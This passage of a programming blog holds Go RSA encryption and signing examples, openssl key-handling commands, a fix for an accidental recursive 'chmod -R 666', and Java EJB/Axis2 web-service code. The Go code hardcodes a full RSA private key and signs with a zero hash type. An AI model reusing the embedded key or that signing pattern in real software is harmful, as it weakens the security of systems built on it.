\n[%s]\n&quot;, encryptedPKCS1v15, decryptedPKCS1v15)</span><br><span class="line">	fmt.Println()</span><br><span class="line"></span><br><span class="line">	// SignPKCS1v15</span><br><span class="line">	var h crypto.Hash</span><br><span class="line">	message := []byte(&quot;This is the message to be signed!&quot;)</span><br><span class="line">	hash := sha1.New()</span><br><span class="line">	io.WriteString(hash, string(message))</span><br><span class="line">	hashed := hash.Sum(nil)</span><br><span class="line"></span><br><span class="line">	signature, err := rsa.SignPKCS1v15(rand.Reader, privatekey, h, hashed)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		os.Exit(1)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(&quot;PKCS1v15 Signature : %x\n&quot;, signature)</span><br><span class="line"></span><br><span class="line">	//VerifyPKCS1v15</span><br><span class="line">	err = rsa.VerifyPKCS1v15(publickey, h, hashed, signature)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(&quot;VerifyPKCS1v15 failed&quot;)</span><br><span class="line">		os.Exit(1)</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		fmt.Println(&quot;VerifyPKCS1v15 successful&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;crypto/rand&quot;</span><br><span class="line">	&quot;crypto/rsa&quot;</span><br><span class="line">	&quot;crypto/x509&quot;</span><br><span class="line">	&quot;encoding/hex&quot;</span><br><span class="line">	&quot;encoding/pem&quot;</span><br><span class="line">	&quot;errors&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;io/ioutil&quot;</span><br><span class="line">	&quot;math/big&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">show by command prompt</span><br><span class="line">openssl genrsa -out key.pem</span><br><span class="line">openssl rsa -in key.pem  -pubout &gt; key-pub.pem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo polaris@studygolang.com | openssl rsautl \</span><br><span class="line">     -encrypt \</span><br><span class="line">     -pubin -inkey key-pub.pem \</span><br><span class="line"> &gt; cipher.txt</span><br><span class="line"></span><br><span class="line">cat cipher.txt | openssl rsautl \</span><br><span class="line">    -decrypt \</span><br><span class="line">    -inkey key.pem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** OR encoding by base64 **</span><br><span class="line">echo polaris@studygolang.com | openssl rsautl \ </span><br><span class="line">      -encrypt -pubin -inkey key-pub.pem \</span><br><span class="line">      | openssl base64</span><br><span class="line">openssl base64 -d | openssl rsautl -decrypt -inkey key.pem</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">var privateKey = []byte(`</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAwOJK1RJBUwRu/5aCyktTaietXFMOAAkElhSq1M6BocVWs7yD</span><br><span class="line">y592CX30Bl0Ul4faWM9EZSlhak8Ay1CdMNis+lBZanKmAO2bPmSIIYBDQE2BzLIo</span><br><span class="line">MoJWi/Cd5PevioKSRPytqVB/S4+xz1IOD8Y407SZM3LfZ5XMfqC+VHpcnAycQ8iT</span><br><span class="line">FK0s3yjImathFNF3U7fiEzU4G7PJRn8e9ntubDd1pXYABqrVF/REcd/3Rs/qrlhG</span><br><span class="line">v3b7tAXZb2lkSLdCq3Md+BMksxUCoH3rZijSphbZSCdIrzofg+IG0y5WtdsBz6uw</span><br><span class="line">Ol2QX/EUoEdO+xhLgaOFykUoWz037ZzkLEhKkQIDAQABAoIBAB+1lAPPSnnxYqYW</span><br><span class="line">Ak5rb70l5LQm20haMyzRHPx7Loh/vq8xsKELCAardDCPoNEAfn7XJDFVSjSF5GWI</span><br><span class="line">TS84j8de6jQ7wNqqNTleoZqQUX4Cv/H83+rdzoiW9/4qUet9Z7p7p7kMCMFNUDf7</span><br><span class="line">D2C8f58eM4lnux52W/X9SwzsSMlGaGHcAKPz4vXUFWyt3naVtANhdkHjgKxA0Ev4</span><br><span class="line">W7yRgpbOKruPKzBNTRXAqq+yHZj/pONtXl8do+plwhHU8CW0BPyvkU4DH52lxWza</span><br><span class="line">mM71ow8UJC30FXF/NZ+wthFnRZO3/dhaeuNYgX7yAs3DhNn7Q8nzU4ujd8ug2OGf</span><br><span class="line">iJ9C8YECgYEA32KthV7VTQRq3VuXMoVrYjjGf4+z6BVNpTsJAa4kF+vtTXTLgb4i</span><br><span class="line">jpUrq6zPWZkQ/nR7+CuEQRUKbky4SSHTnrQ4yIWZTCPDAveXbLwzvNA1xD4w4nOc</span><br><span class="line">JgG/WYiDtAf05TwC8p/BslX20Ox8ZAXUq6pkAeb1t8M2s7uDpZNtBMkCgYEA3QuU</span><br><span class="line">vrrqYuD9bQGl20qJI6svH875uDLYFcUEu/vA/7gDycVRChrmVe4wU5HFErLNFkHi</span><br><span class="line">uifiHo75mgBzwYKyiLgO5ik8E5BJCgEyA9SfEgRHjozIpnHfGbTtpfh4MQf2hFsy</span><br><span class="line">DJbeeRFzQs4EW2gS964FK53zsEtnr7bphtvfY4kCgYEAgf6wr95iDnG1pp94O2Q8</span><br><span class="line">+2nCydTcgwBysObL9Phb9LfM3rhK/XOiNItGYJ8uAxv6MbmjsuXQDvepnEp1K8nN</span><br><span class="line">lpuWN8rXTOG6yG1A53wWN5iK0WrHk+BnTA7URcwVqJzAvO3RYVPqqlcwTKByOtrR</span><br><span class="line">yhxcGmdHMusdWDaVA7PpS1ECgYATCGs/XQLPjsXje+/XCPzz+Epvd7fi12XpwfQd</span><br><span class="line">Z5j/q82PsxC+SQCqR38bwwJwELs9/mBSXRrIPNFbJEzTTbinswl9YfGNUbAoT2AK</span><br><span class="line">GmWz/HBY4uBoDIgEQ6Lu1o0q05+zV9LgaKExVYJSL0EKydRQRUimr8wK0wNTivFi</span><br><span class="line">rk322QKBgHD3aEN39rlUesTPX8OAbPD77PcKxoATwpPVrlH8YV7TxRQjs5yxLrxL</span><br><span class="line">S21UkPRxuDS5CMXZ+7gA3HqEQTXanNKJuQlsCIWsvipLn03DK40nYj54OjEKYo/F</span><br><span class="line">UgBgrck6Zhxbps5leuf9dhiBrFUPjC/gcfyHd/PYxoypHuQ3JUsJ</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">`)</span><br><span class="line"></span><br><span class="line">var publicKey = []byte(`</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwOJK1RJBUwRu/5aCyktT</span><br><span class="line">aietXFMOAAkElhSq1M6BocVWs7yDy592CX30Bl0Ul4faWM9EZSlhak8Ay1CdMNis</span><br><span class="line">+lBZanKmAO2bPmSIIYBDQE2BzLIoMoJWi/Cd5PevioKSRPytqVB/S4+xz1IOD8Y4</span><br><span class="line">07SZM3LfZ5XMfqC+VHpcnAycQ8iTFK0s3yjImathFNF3U7fiEzU4G7PJRn8e9ntu</span><br><span class="line">bDd1pXYABqrVF/REcd/3Rs/qrlhGv3b7tAXZb2lkSLdCq3Md+BMksxUCoH3rZijS</span><br><span class="line">phbZSCdIrzofg+IG0y5WtdsBz6uwOl2QX/EUoEdO+xhLgaOFykUoWz037ZzkLEhK</span><br><span class="line">kQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">`)</span><br><span class="line"></span><br><span class="line">func RsaEncryptByPreSetPubKey() string &#123;</span><br><span class="line">	n, _ := new(big.Int).SetString(&quot;24349343452348953201209477858721354875245881458202672294652984377378513954748002477250933828219774703952578332297494223229725595176463711802920124930360492553186030821158773846902662847263120685557322462156596316871394035160273640449724455863863094140814233064652945361596472111169159061323006507670749392076044355771083774400487999226532334510138900864338047649454583762051951010712101235391104817996664455285600818344773697074965056427233256586264138950003914735074112527568699379597208762648078763602593269860453947862814755877433560650621539845829407336712267915875159364773551462882284084578152070138814976772753&quot;, 10)</span><br><span class="line">	e, _ := strconv.ParseInt(&quot;10001&quot;, 16, 0)</span><br><span class="line"></span><br><span class="line">	fmt.Printf(&quot;##RsaEncrypt2 n %x\n&quot;, n)</span><br><span class="line">	fmt.Printf(&quot;##RsaEncrypt2 e %x\n&quot;, e)</span><br><span class="line">	pubKey := rsa.PublicKey&#123;n, int(e)&#125;</span><br><span class="line">	data, _ := rsa.EncryptPKCS1v15(rand.Reader, &amp;pubKey, []byte(&quot;it&#x27;s great for rsa&quot;))</span><br><span class="line"></span><br><span class="line">	return hex.EncodeToString(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	msg := &quot;polaris@studygolang.com&quot;</span><br><span class="line">	data, err := RsaEncrypt([]byte(msg))</span><br><span class="line">	fmt.Printf(&quot;PKCS1v15 encrypted [%s] to \n[%x]\n&quot;, string(msg), data)</span><br><span class="line"></span><br><span class="line">	ioutil.WriteFile(&quot;encrypted.txt&quot;, data, 0644)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	origData, err := RsaDecrypt(data)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;origData &gt;&gt; &quot;, string(origData))</span><br><span class="line"></span><br><span class="line">	//cipherText, _ := hex.DecodeString(&quot;b6ee3caf14430003a20625ba1ea9ad31560ad203f7ecee46dd8e31f2dc47d278f3248bc0180e03571fdbf34a60aad7310468e6d6013fcfd6b785d1562411b44e089281adcc275a2037db3dec8b447b91162c859ab97372081c1bcb22a1fb33b1f72a06a54b1784d9f733aa1e869c6d64d45a7a78534714a773920ef7219b31f89092fc54f87ff371aeae5c3e59cdaad3fa05c24e781e06fcd46b35127a431bd85f62bafded95e3d31127159a0b5d13b77f11ecef94a037ac1d2f2c32fc0e6623cfe056127457f8f82631c33139a50fcd16c17e577b12f853cd55ffb16e099097dd76a21d987c536ac102b470e36881fc86f1667b505120a531458a116ca285b7&quot;)</span><br><span class="line">	cipherText, _ := hex.DecodeString(RsaEncryptByPreSetPubKey())</span><br><span class="line"></span><br><span class="line">	origData2, err := RsaDecrypt(cipherText)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;origData2 &gt;&gt; &quot;, string(origData2))</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 加密</span><br><span class="line">func RsaEncrypt(origData []byte) ([]byte, error) &#123;</span><br><span class="line">	block, _ := pem.Decode(publicKey)</span><br><span class="line">	if block == nil &#123;</span><br><span class="line">		return nil, errors.New(&quot;public key error&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	pub := pubInterface.(*rsa.PublicKey)</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;Modulus : &quot;, pub.N.String())</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;&gt;&gt;&gt; &quot;, pub.N)</span><br><span class="line">	fmt.Printf(&quot;Modulus(Hex) : %X\n&quot;, pub.N)</span><br><span class="line">	fmt.Println(&quot;Public Exponent : &quot;, pub.E)</span><br><span class="line"></span><br><span class="line">	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 解密</span><br><span class="line">func RsaDecrypt(ciphertext []byte) ([]byte, error) &#123;</span><br><span class="line">	block, _ := pem.Decode(privateKey)</span><br><span class="line">	if block == nil &#123;</span><br><span class="line">		return nil, errors.New(&quot;private key error!&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Repair-file-system-openssl-keygen" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2016-07-27T07:25:46.000Z"><a href="/2016/07/27/Repair-file-system-openssl-keygen/">2016-07-27</a></time>
      
      
  
    <h1 class="title"><a href="/2016/07/27/Repair-file-system-openssl-keygen/">Repair file system openssl keygen</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>On folder &#x2F;opt, just want to change the directory mode to 666, but run <code>sudo chmod -R 666 ..</code>, then all commands like ‘ls’, ‘which’, ‘pwd’ do not work.</p>
<ul>
<li><p>Fix<br>Login as root, run <code>chmod 755 /</code> <code>chmod 755 /bin</code> <code>chmod 755 /usr</code></p>
</li>
<li><p>Openssl and Keygen<br>&#96;<br>ssh public key stored in .ssh folder:<br>ssh-keygen -f koding -y &gt; koding_id_rsa.pub</p>
</li>
</ul>
<p>output public key from the private key<br>openssl rsa -in koding -pubout &gt; koding-pub.pem</p>
<p>p12 file (usually with .pfx extension) contains certificate, public key, private key<br>openssl x509 - for certificate<br>openssl x509 -inform der -in certificate.cer -out certificate.pem (with -pubkey -noout to print public key only)</p>
<p>openssl pkcs12 - for p12 file<br>openssl pkcs12 -in certificate.pfx -out certificate.cer -nodes</p>
<p>openssl rsa - for private key<br>openssl rsa -in koding -out koding2 (Remove a passphrase from a private key)</p>
<p>openssl req - for private key and csr related<br>openssl req -out CSR.csr -key privateKey.key -new<br>&#96;</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Axis2-xmlbeans-EJB3-Extension-B-Character" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2016-01-05T03:56:02.000Z"><a href="/2016/01/05/Axis2-xmlbeans-EJB3-Extension-B-Character/">2016-01-05</a></time>
      
      
  
    <h1 class="title"><a href="/2016/01/05/Axis2-xmlbeans-EJB3-Extension-B-Character/">Axis2-xmlbeans-EJB3-Extension-B-Character</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Class-MyEJB"><a href="#Class-MyEJB" class="headerlink" title="Class MyEJB"></a>Class MyEJB</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">package my.test;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Calendar;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">import xx.webservices.type.ESubmissionBatchType;</span><br><span class="line">import xx.webservices.type.ESubmissionListType;</span><br><span class="line">import xx.webservices.type.YYSubmissionRequestDocument;</span><br><span class="line">import xx.webservices.type.YYSubmissionResponseDocument;</span><br><span class="line"></span><br><span class="line">import javax.annotation.security.PermitAll;</span><br><span class="line">import javax.ejb.EJBException;</span><br><span class="line">import javax.ejb.Stateless;</span><br><span class="line">import javax.ejb.TransactionManagement;</span><br><span class="line">import javax.ejb.TransactionManagementType;</span><br><span class="line"></span><br><span class="line">@Stateless(name = &quot;MyEJB&quot;)</span><br><span class="line">@TransactionManagement(TransactionManagementType.BEAN)</span><br><span class="line">@PermitAll</span><br><span class="line">public class MyEJB implements IMyEJB, IMyEJBLocal &#123;</span><br><span class="line">	public YYSubmissionResponseDocument getYYSubmission(YYSubmissionRequestDocument YYSubmissionRequest)</span><br><span class="line">			throws EJBException &#123;</span><br><span class="line">		YYSubmissionResponseDocument outDoc = YYSubmissionResponseDocument.Factory.newInstance();</span><br><span class="line">		ESubmissionBatchType esubBatchType = outDoc.addNewYYSubmissionResponse().addNewOut();</span><br><span class="line">		Calendar fromDate = Calendar.getInstance();</span><br><span class="line">		Calendar toDate = Calendar.getInstance();</span><br><span class="line"></span><br><span class="line">		esubBatchType.setFromDateTime(fromDate);</span><br><span class="line">		esubBatchType.setToDateTime(toDate);</span><br><span class="line"></span><br><span class="line">		List&lt;String&gt; returnList = new ArrayList&lt;String&gt;();</span><br><span class="line">		String a = &quot;\uD840\udcd9&quot;;</span><br><span class="line">		String b = &quot;\uD840\udc59&quot;;</span><br><span class="line">		returnList.add(a);</span><br><span class="line">		returnList.add(b);</span><br><span class="line"></span><br><span class="line">		ESubmissionListType eSubmitListType = esubBatchType.addNewESubmissionList();</span><br><span class="line">		for (int i = 0; i &lt; returnList.size(); i++) &#123;</span><br><span class="line">			eSubmitListType.addESubmission(returnList.get(i));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		esubBatchType.setNoOfSubmission(new Integer(eSubmitListType.sizeOfESubmissionArray()).toString());</span><br><span class="line"></span><br><span class="line">		return outDoc;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Interface-IMyEJB"><a href="#Interface-IMyEJB" class="headerlink" title="Interface IMyEJB"></a>Interface IMyEJB</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package my.test;</span><br><span class="line"></span><br><span class="line">import xx.webservices.type.YYSubmissionRequestDocument;</span><br><span class="line">import xx.webservices.type.YYSubmissionResponseDocument;</span><br><span class="line"></span><br><span class="line">import javax.ejb.EJBException;</span><br><span class="line">import javax.ejb.Remote;</span><br><span class="line"></span><br><span class="line">@Remote</span><br><span class="line">public interface IMyEJB &#123;</span><br><span class="line">	public YYSubmissionResponseDocument getYYSubmission(YYSubmissionRequestDocument YYSubmissionRequest)</span><br><span class="line">			throws EJBException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Interface-IMyEJBLocal"><a href="#Interface-IMyEJBLocal" class="headerlink" title="Interface IMyEJBLocal"></a>Interface IMyEJBLocal</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package my.test;</span><br><span class="line"></span><br><span class="line">import xx.webservices.type.YYSubmissionRequestDocument;</span><br><span class="line">import xx.webservices.type.YYSubmissionResponseDocument;</span><br><span class="line"></span><br><span class="line">import javax.ejb.EJBException;</span><br><span class="line">import javax.ejb.Local;</span><br><span class="line"></span><br><span class="line">@Local</span><br><span class="line">public interface IMyEJBLocal &#123;</span><br><span class="line">	public YYSubmissionResponseDocument getYYSubmission(YYSubmissionRequestDocument YYSubmissionRequest)</span><br><span class="line">			throws EJBException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Class-ABCSkeleton"><a href="#Class-ABCSkeleton" class="headerlink" title="Class ABCSkeleton"></a>Class ABCSkeleton</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package my.test;</span><br><span class="line"></span><br><span class="line">public class ABCSkeleton &#123;</span><br><span class="line"></span><br><span class="line">	public xx.webservices.type.YYSubmissionResponseDocument getYYSubmission(</span><br><span class="line">			xx.webservices.type.YYSubmissionRequestDocument YYSubmissionRequest) &#123;</span><br><span class="line"></span><br><span class="line">		xx.webservices.type.YYSubmissionResponseDocument outDoc = null;</span><br><span class="line">		try &#123;</span><br><span class="line">			outDoc = getMyEJB().getYYSubmission(YYSubmissionRequest);</span><br><span class="line">			return outDoc;</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			log.error(&quot;Exception in getYYSubmission&quot;, e);</span><br><span class="line">			throw new java.lang.UnsupportedOperationException(e);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  private IMyEJB getMyEJB() throws Exception &#123;</span><br><span class="line">		InitialContext initialContext = new InitialContext();</span><br><span class="line">		IMyEJB myEJB = (IMyEJB) initialContext.lookup(&quot;java:app/my_app/MyEJB!my.test.IMyEJB&quot;);</span><br><span class="line">		return myEJB;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="application-xml"><a href="#application-xml" class="headerlink" title="application.xml"></a>application.xml</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;application </span><br><span class="line">	xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; </span><br><span class="line">	xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">	xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/application_6.xsd&quot;</span><br><span class="line">	version=&quot;6&quot;&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;application-name&gt;ww_ds&lt;/application-name&gt;</span><br><span class="line">	&lt;initialize-in-order&gt;true&lt;/initialize-in-order&gt;</span><br><span class="line"></span><br><span class="line">	&lt;module&gt;</span><br><span class="line">		&lt;web&gt;</span><br><span class="line">			&lt;web-uri&gt;axis2.war&lt;/web-uri&gt;</span><br><span class="line">			&lt;context-root&gt;yy_ws&lt;/context-root&gt;</span><br><span class="line">		&lt;/web&gt;</span><br><span class="line">	&lt;/module&gt;</span><br><span class="line">	&lt;module&gt;</span><br><span class="line">		&lt;ejb&gt;my_app.jar&lt;/ejb&gt;</span><br><span class="line">	&lt;/module&gt;</span><br><span class="line">	&lt;library-directory&gt;lib&lt;/library-directory&gt;</span><br><span class="line">&lt;/application&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Deploy-this-ear-to-JBoss-EAP-6-4"><a href="#Deploy-this-ear-to-JBoss-EAP-6-4" class="headerlink" title="Deploy this ear to JBoss EAP 6.4"></a>Deploy this ear to JBoss EAP 6.4</h1><p> copy the yy.ear to folder <code>sftp://support@10.13.135.37//opt/software/jboss-eap-6.4/standalone/deployments/</code></p>
<h1 id="Call-webservice-via-http"><a href="#Call-webservice-via-http" class="headerlink" title="Call webservice via http"></a>Call webservice via http</h1><p> <code>curl http://10.13.135.37:9080/yy_ws/services/esubmission/getYYSubmission</code><br> Throw error as </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line">&lt;faultstring&gt;</span><br><span class="line">java.lang.RuntimeException: JBAS014154: Failed to marshal EJB parameters</span><br><span class="line">&lt;/faultstring&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Trace-log-in-x2F-tmp-x2F-axis2-log"><a href="#Trace-log-in-x2F-tmp-x2F-axis2-log" class="headerlink" title="Trace log in &#x2F;tmp&#x2F;axis2.log"></a>Trace log in &#x2F;tmp&#x2F;axis2.log</h1><p> In yy.ear&#x2F;axis2.war&#x2F;WEB-INF&#x2F;classes&#x2F;log4j.properties, set option <code>log4j.rootCategory=INFO, CONSOLE, LOGFILE</code> and <code>log4j.appender.LOGFILE.File=/tmp/axis2.log</code><br> Found error as </p>
